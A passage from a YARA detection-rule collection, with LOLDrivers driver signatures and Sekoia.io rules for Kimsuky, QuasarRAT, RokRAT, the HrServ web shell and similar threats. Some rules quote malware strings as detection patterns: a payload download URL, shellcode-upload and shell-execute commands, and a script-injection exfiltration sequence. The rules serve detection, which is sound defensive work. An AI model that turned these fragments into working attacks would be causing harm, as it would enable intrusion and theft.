		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Tonecinc_Idmtdisys_Internetdownloadmanager_2C1B
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - idmtdi.sys"
		author = "Florian Roth"
		id = "f09f5edb-c807-599a-8caa-7d892f315462"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L728-L749"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "2c1b65c2988b337182f1ba57b404793454e30a7fd328d34bc2e79857dc437a4a"
		hash = "44ebb0f534e7cdfec06d5234358d219798a313219b214d72aa23afc5a57d7ea9"
		hash = "77225a99b2e0e2b4007fb2f5a96d356e13deab45b9ef54c175d5452de8a211a7"
		logic_hash = "e15700f9f1431b8d9c5682726839c2e30c66394c90e572f22e061cec44f99710"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0049006e007400650072006e0065007400200044006f0077006e006c006f006100640020004d0061006e006100670065007200200054004400490020004400720069007600650072 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0054006f006e0065006300200049006e0063002e }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e00330032002e0033002e00380030 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e00330032002e0033002e0031 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00690064006d007400640069002e007300790073 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]0049006e007400650072006e0065007400200044006f0077006e006c006f006100640020004d0061006e0061006700650072 }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00690064006d007400640069002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a9002000310039003900390020002d0020003200300031003800200054006f006e0065006300200049006e0063002e }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Dwadsafeloadsys_E112
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - driver_e1123b59.sys"
		author = "Florian Roth"
		id = "ca8a37aa-8bb6-5cf6-ae3a-4747611571a0"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L752-L771"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "e1123b59a801e243a64270d0c6ab1277e5e3afba9c19023807409f53c1b0204b"
		logic_hash = "478f361102f57948fedbc00b49f0874b915b2fc65bb4be900593da8ad4fe24d3"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]5ba262377aef52a08f7d9a7152a8 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]6e56531776fe7f517f517edc79d1628067099650516c53f8 }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0032003000320032002e0031002e00310036002e0031003000300030 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032003000320032002e0031002e00310036002e0031003000300030 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00640077006100640073006100660065006c006f00610064002e007300790073 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]76fe7f514e3b52a896325fa17cfb7edf }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00640077006100640073006100660065006c006f00610064002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000320032 }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Paloaltonetworksinc_Cyvrlpcsys_Cortexxdradvancedendpointprotection_2CD7
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - idmtdi.sys"
		author = "Florian Roth"
		id = "e0bb1b7c-2ce2-5ab8-96fe-0f1d7c26c8b3"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L774-L793"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "2cd7a0c4e8d24404c92e4ed8539b2136028a8ca663f3432e417b00665493e13f"
		logic_hash = "8f4bf095708c18a441369088b362fb65779c7009bf1c2e8ac2a8e06ef0af44c0"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0043006f007200740065007800200058004400520020004c005000430020004400720069007600650072 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00500061006c006f00200041006c0074006f0020004e006500740077006f0072006b0073002c00200049006e0063002e }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0038002e0032002e0032002e00340039003700300038 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0038002e0032002e0032002e00340039003700300038 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0063007900760072006c00700063002e007300790073 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043006f00720074006500780020005800440052212200200041006400760061006e00630065006400200045006e00640070006f0069006e0074002000500072006f00740065006300740069006f006e }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0063007900760072006c00700063002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a9002000500061006c006f00200041006c0074006f0020004e006500740077006f0072006b0073002c00200049006e0063002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064 }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Microsoftcorporation_Srvnetsys_Microsoftwindowsoperatingsystem_F6C3
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - WinTapix.sys, SRVNET2.SYS"
		author = "Florian Roth"
		id = "3559718f-59d7-5bff-860c-6a073f4c05d9"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L796-L815"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "f6c316e2385f2694d47e936b0ac4bc9b55e279d530dd5e805f0d963cb47c3c0d"
		logic_hash = "ab1aea5cec71668c0e35ea149b9e537c8468738c3b3e70382ebedf51bb8729d0"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0053006500720076006500720020004e006500740077006f0072006b0020006400720069007600650072 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]00310030002e0030002e00310038003300360032002e0036003900330020002800570069006e004200750069006c0064002e003100360030003100300031002e00300038003000300029 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310030002e0030002e00310038003300360032002e003600390033 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]005300520056004e004500540032002e005300590053 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d006900630072006f0073006f0066007400ae002000570069006e0064006f0077007300ae0020004f007000650072006100740069006e0067002000530079007300740065006d }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]005300520056004e004500540032002e005300590053 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a90020004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Microsoftcorporation_Wantdsys_Microsoftwindowsoperatingsystem_81C7
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - wantd_3.sys"
		author = "Florian Roth"
		id = "43ae822a-c4c4-5525-bfd3-a05d1ec50bd0"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L818-L837"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "81c7bb39100d358f8286da5e9aa838606c98dfcc263e9a82ed91cd438cb130d1"
		logic_hash = "ec9e321bbc89bffb6243e3edde45e60dc06513e88dfb9a262768ef081db60c5b"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00570041004e0020005400720061006e00730070006f007200740020004400720069007600650072 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e0032002e0033003700390030002e003900330038 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e0032002e0033003700390030002e003900330038 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00770061006e00740064002e007300790073 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d006900630072006f0073006f00660074002000570069006e0064006f007700730020004f007000650072006100740069006e0067002000530079007300740065006d }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00770061006e00740064002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_773B
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - mimidrv.sys"
		author = "Florian Roth"
		id = "f47ab2f1-86f6-5550-939e-4477ec1c367c"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L840-L854"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "773b4a1efb9932dd5116c93d06681990759343dfe13c0858d09245bc610d5894"
		logic_hash = "5e01850384ac0dc0e9f33e3e217e0e824cfe3c2bb46feff94dffa070f2f7c9a0"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0031002e0031002e0030 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0031002e0031002e0030 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003000370020002d002000320030003100370020 }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Sensecorp_7F45
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - Sense5Ext.sys"
		author = "Florian Roth"
		id = "6c1f5ba4-fd14-5069-9d99-e3072b2dbbc2"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L857-L873"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "7f4555a940ce1156c9bcea9a2a0b801f9a5e44ec9400b61b14a7b1a6404ffdf6"
		logic_hash = "dbef723d7e44da110675402fc13708c5b077eeb6a66c1772885f5879d795ec4e"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00530065006e0073006500350020004400720069007600650072 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00530065006e00730065003500200043004f00520050 }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0032002e0036002e0030002e0030 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0032002e0036002e0030002e0030 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000320032 }

	condition:
		all of them
}

rule LOLDRIVERS_MAL_Driver_Microsoftcorporation_Ndislansys_Microsoftwindowsoperatingsystem_B0EB
{
	meta:
		description = "Detects malicious driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ndislan.sys"
		author = "Florian Roth"
		id = "c94adcf3-2ea6-5856-9327-2e5ed1c49b22"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/magicsword-io/LOLDrivers"
		source_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/detections/yara/yara-rules_mal_drivers.yar#L876-L895"
		license_url = "https://github.com/magicsword-io/LOLDrivers//blob/e2e48f15a0885e8b2ad2fb81255089845f5c183c/LICENSE"
		hash = "b0eb4d999e4e0e7c2e33ff081e847c87b49940eb24a9e0794c6aa9516832c427"
		logic_hash = "4b92b69636dea19a23172def47e9a1bbd4507075ec118b48db30fec377b8fbff"
		score = 70
		quality = 80
		tags = ""

	strings:
		$ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004d00530020004c0041004e0020004400720069007600650072 }
		$ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e }
		$ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e0031003400320031 }
		$ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e0031003400320031 }
		$ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e006400690073006c0061006e002e007300790073 }
		$ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d006900630072006f0073006f0066007400ae002000570069006e0064006f0077007300ae0020004f007000650072006100740069006e0067002000530079007300740065006d }
		$ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006e006400690073006c0061006e002e007300790073 }
		$ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a90020004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e }

	condition:
		all of them
}

rule SEKOIA_Downloader_Kimsuky_Lnk
{
	meta:
		description = "Detect Kimsuky LNK"
		author = "Sekoia.io"
		id = "3831d115-7874-4bc9-aeb4-d2cb9bc2b5c9"
		date = "2024-07-16"
		modified = "2024-12-19"
		reference = "https://blogs.jpcert.or.jp/en/2024/07/attack-activities-by-kimsuky-targeting-japanese-organizations.html"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/downloader_kimsuky_lnk.yar#L1-L22"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "3512c8c21203a015b316c2a993db1a8c10420df06ea97d84a6e350550a628230"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"
		hash1 = "3065b8e4bb91b4229d1cea671e8959da8be2e7482067e1dd03519c882738045e"
		hash2 = "d912f49d24792aa7197509f76e2097ac3858cde23199e1b40f2516948d39c589"
		hash3 = "e936445935c4a636614f7113e4121695a5f3e4a6c137b7cdcceb6f629aa957c4"
		hash4 = "fe156159a26f8b7c140db61dd8b136e1c8103a800748fe9b70a3a3fdf179d3c3"

	strings:
		$ = "AType: Text Document" wide
		$ = "Size: 5.23 KB" wide
		$ = "Date modified: 01/02/2020 11:23" wide

	condition:
		all of them
}

rule SEKOIA_Apt_Darkpink_Kamikakabot_Strings
{
	meta:
		description = "Detects KamiKakaBot strings (.NET sample of Dark Pink)"
		author = "Sekoia.io"
		id = "0f5a7d72-81c8-4fdd-aefd-136bc6d48aa5"
		date = "2023-02-22"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_darkpink_kamikakabot_strings.yar#L1-L30"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "0bc37c96b591d8edb1fd288ef874b3cc31879ce166b8734a3dd0e29644cbea55"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "Execute"
		$ = "f4869"
		$ = "getIndentifyName"
		$ = "getMessageAsync"
		$ = "requestMessageID"
		$ = "run_command"
		$ = "sendFile"
		$ = "sendMessage"
		$ = "send_brw_data"
		$ = "updateMessageID"
		$ = "update_new_token"
		$ = "update_new_xml"
		$ = {53 00 74 00 61 00 72 00 74 00 65 00 64 00 20 00 75 00 70 00 20 00 72 00 75 00 6e}
		$ = {20 00 72 00 65 00 63 00 6f 00 6e 00 6e 00 65 00 63 00 74 00 65 00 64 00 21}
		$ = {6e 00 65 00 77 00 20 00 63 00 6f 00 6e 00 6e 00 65 00 63 00 74 00 65 00 64 00 21}
		$ = {74 00 6f 00 6b 00 65 00 6e 00 20 00 75 00 70 00 64 00 61 00 74 00 65 00 20 00 73 00 75 00 63 00 63 00 65 00 73 00 73 00 21 00 21 00 21}

	condition:
		6 of them
}

rule SEKOIA_Storm_1811_Screenconnect_Update
{
	meta:
		description = "Detects files used in a campaign performed by the intrusion set Storm-1811"
		author = "Sekoia.io"
		id = "252ef24a-14dc-41e8-ba91-dcb9b6deb428"
		date = "2024-06-11"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/storm_1811_screenconnect_update.yar#L1-L22"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "ad61e28566375fd3c029df79e1b608aac921ab8121a43bd01314c9112197c32e"
		score = 75
		quality = 55
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = "upd100.appspot.com/update/u.zip" ascii fullword
		$s2 = "Unzip ok" ascii fullword
		$s3 = "Installing update" ascii fullword
		$s4 = "Administrators" ascii fullword
		$s5 = "I am not admin" ascii fullword
		$s6 = "I am admin" ascii fullword
		$s7 = "ScreenConnect.ClientSetup.exe" ascii fullword
		$s8 = "for %%x in (%IPS%) do (" ascii fullword

	condition:
		6 of them
}

rule SEKOIA_Loader_Win_Dodgebox
{
	meta:
		description = "Detect the DodgeBox malware using several criteria"
		author = "Sekoia.io"
		id = "8d5f94f3-1add-4f34-ba9e-f8f576c4e5b8"
		date = "2024-07-15"
		modified = "2024-12-19"
		reference = "https://www.zscaler.com/blogs/security-research/dodgebox-deep-dive-updated-arsenal-apt41-part-1"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/loader_win_dodgebox.yar#L4-L29"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "e859da15a065454d273c4040b4e3409c3046cbcee135497bdcce6cff620c3cfb"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"
		hash1 = "c6a3a1ea84251aed908702a1f2a565496d583239c5f467f5dcd0cfc5bfb1a6db"
		hash2 = "33fd050760e251ab932e5ca4311b494ef72cee157b20537ce773420845302e49"

	condition:
		pe.imphash( ) == "aeea1135af87e6b6b23fa7da995967ea" or hash.md5 ( pe.rich_signature.clear_data ) == "1c850cf955b35f60ee6c12d01161d95d" or for any i in ( 0 .. pe.number_of_sections -1 ) : ( hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "4a80edcce2a5ac85c3f849172ee89c0f" or hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "53781057440f51882c38d3a9ef611775" or hash.md5 ( pe.sections [ i ] . raw_data_offset , pe.sections [ i ] . raw_data_size ) == "801b286d84a97fe919721843ab77210d" )
}

rule SEKOIA_Apt37_Rokrat_Macho
{
	meta:
		description = "Detects Public key of Macho samples of RokRAT"
		author = "Sekoia.io"
		id = "c54fb9ae-85fa-4c36-bab9-6c6d989262ba"
		date = "2022-09-29"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt37_rokrat_macho.yar#L1-L21"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "526dc4594db099ed8090a673e761f84f6dd7ce860e380214e4d3f1ec08fc2345"
		score = 75
		quality = 66
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s1 = { 4D 49 49 42 49 6A 41 4E 42 67 6B 71 68 6B 69 47 39 77 30 42 41 51 45 46 41 41 4F 43 41 51 38 41 4D 49 49 42 43 67 4B 43 41 51 45 41 73 47 52 59 53 45 56 76 77 6D 66 42 46 4E 42 6A 4F 7A 2B 51}
		$s2 = {70 61 78 35 72 7A 57 66 2F 4C 54 2F 79 46 55 51 41 31 7A 72 41 31 6E 6A 6A 79 49 48 72 7A 70 68 67 63 39 74 67 47 48 73 2F 37 74 73 57 70 38 65 35 64 4C 6B 41 59 73 56 47 68 57 41 50 73 6A 79}
		$s3 = {31 67 78 30 64 72 62 64 4D 6A 6C 54 62 42 59 54 79 45 67 35 50 67 79 2F 35 4D 73 45 4E 44 64 6E 73 43 52 57 72 32 33 5A 61 4F 45 4C 76 48 48 56 56 38 43 4D 43 38 46 75 34 57 62 61 7A 38 30 4C}
		$s4 = {47 68 67 38 69 73 56 50 45 48 43 38 48 2F 79 47 74 6A 48 50 59 46 56 65 36 6C 77 56 72 2F 4D 58 6F 4B 63 70 78 31 33 53 31 4B 38 6E 6D 44 51 4E 41 68 4D 70 54 31 61 4C 61 47 2F 36 51 69 6A 68}
		$s5 = {57 34 50 2F 52 46 51 71 2B 46 64 69 61 33 66 46 65 68 50 67 35 44 74 59 44 39 30 72 53 33 73 64 46 4B 6D 6A 39 4E 36 4D 4F 30 2F 57 41 56 64 5A 7A 47 75 45 58 44 35 33 4C 48 7A 39 65 5A 77 52}
		$s6 = {39 59 38 37 38 36 6E 56 44 72 6C 6D 61 35 59 43 4B 70 71 55 5A 35 63 34 36 77 57 33 67 59 57 69 33 73 59 2B 56 53 33 62 32 46 64 41 4B 43 4A 68 54 66 43 79 38 32 41 55 47 71 50 53 56 66 4C 61}
		$s7 = {6D 51 49 44 41 51 41 42}

	condition:
		all of them
}

rule SEKOIA_Apt_Unk_Hrserv_Memory_Commands_Strings
{
	meta:
		description = "Detects HrServ web shell memory commands"
		author = "Sekoia.io"
		id = "1b5f442a-e758-4bd5-a612-8b504a542d29"
		date = "2023-11-23"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_unk_hrserv_memory_commands_strings.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "a87c35658ded301c098f9ee8ee5886a54e89537eabd145cf82b0286c703a77d2"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = "list all the process" ascii wide
		$ = "equal with cmd /c tasklist" ascii wide
		$ = "start target service by name" ascii wide
		$ = "query local process information by wmi." ascii wide
		$ = "upload local shellcode to" ascii wide

	condition:
		all of them
}

rule SEKOIA_Apt_Uta0178_Javascript_Inclusion_Strings
{
	meta:
		description = "Detects UTA0178 malicious inclusion strings"
		author = "Sekoia.io"
		id = "af816c35-1f00-47ea-86ee-c034607c625e"
		date = "2024-01-12"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_uta0178_javascript_inclusion_strings.yar#L1-L23"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "d3fedf49417178df374d6ae20e57ffcfa00cb68a647769964c049d9a8e0f4958"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s0 = ".value"
		$s1 = "btoa("
		$s2 = "https://"
		$s3 = "new XMLHttpRequest();"
		$s4 = ".send(null);"

	condition:
		@s0< @s1 and @s1 < @s2 and @s2 < @s3 and @s3 < @s4 and @s4- @s0 < 350
}

rule SEKOIA_Apt_Unc4990_Explorer_Ps1
{
	meta:
		description = "Detects powershell script (explorer.ps1)"
		author = "Sekoia.io"
		id = "2e1abbbf-f9b7-4147-b7da-3544cbc4a5f1"
		date = "2024-02-01"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/apt_unc4990_explorer_ps1.yar#L1-L19"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "5085f738e23b801c7e36408d189755086d91c0bb266af6738c80510eb85e598f"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$s0 = "$(get-location).Path"
		$s1 = "+ \"\\Runtime Broker.exe"
		$s2 = "Start-Process -FilePath"
		$s3 = "-Wait;"
		$s4 = "Start-Sleep -s"

	condition:
		all of them and @s3- @s2 < 35
}

rule SEKOIA_Implant_Win_Quasarrat
{
	meta:
		description = "Detect QuasarRAT (reted from samples 2023-03)"
		author = "Sekoia.io"
		id = "492fdffc-8e5f-4225-a2eb-cd6d80e6bcb8"
		date = "2023-03-17"
		modified = "2024-12-19"
		reference = "https://blog.alyac.co.kr/5103"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/implant_win_quasarrat.yar#L1-L25"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "d3c1d65a23aaea5423025cb2f755d0f2298cbf02b2a4e34430eae8c3e1263185"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	strings:
		$ = {63 00 68 00 63 00 70 00 20 00 36 00 35 00 30 00 30 00 31 00}
		$ = {65 00 63 00 68 00 6f 00 20 00 44 00 4f 00 4e 00 54 00 20 00 43 00 4c 00 4f 00 53 00 45 00 20 00 54 00 48 00 49 00 53 00 20 00 57 00 49 00 4e 00 44 00 4f 00 57 00 21 00}
		$ = {70 00 69 00 6e 00 67 00 20 00 2d 00 6e 00 20 00 31 00 30 00 20 00 6c 00 6f 00 63 00 61 00 6c 00 68 00 6f 00 73 00 74 00 20 00 3e 00 20 00 6e 00 75 00 6c 00}
		$ = {64 00 65 00 6c 00 20 00 2f 00 61 00 20 00 2f 00 71 00 20 00 2f 00 66 00 20 00 22 00}
		$ = "DoShellExecute"
		$ = "DoDownloadFile"

	condition:
		all of them
}

rule SEKOIA_Ransomware_Win_Eking_Rich_Header
{
	meta:
		description = "Detect Eking ransomware using its rich header"
		author = "Sekoia.io"
		id = "9fe76f89-f27a-4a47-a61c-2d767a1a8acb"
		date = "2021-10-07"
		modified = "2024-12-19"
		reference = "https://github.com/SEKOIA-IO/Community"
		source_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/yara_rules/ransomware_win_eking_rich_header.yar#L4-L15"
		license_url = "https://github.com/SEKOIA-IO/Community/blob/a47734fa931e56f8646dab2abf31629431982429/LICENSE.md"
		logic_hash = "0028200fc2e929dba6fcc4ddf5d8e07825842e2f65c69ad94ebd032ae3748c90"
		score = 75
		quality = 80
		tags = ""
		version = "1.0"
		classification = "TLP:CLEAR"

	condition:
		hash.md5( pe.rich_signature.clear_data ) == "256b60751602028612562b73ecdb163c"
}

rule SEKOIA_Apt_Kimsuky_Sharpext_Compromised_Securepreferences
{
	meta:
		description = "Detects compromised Chrome SecurePreferences file"
		author = "Sekoia.io"
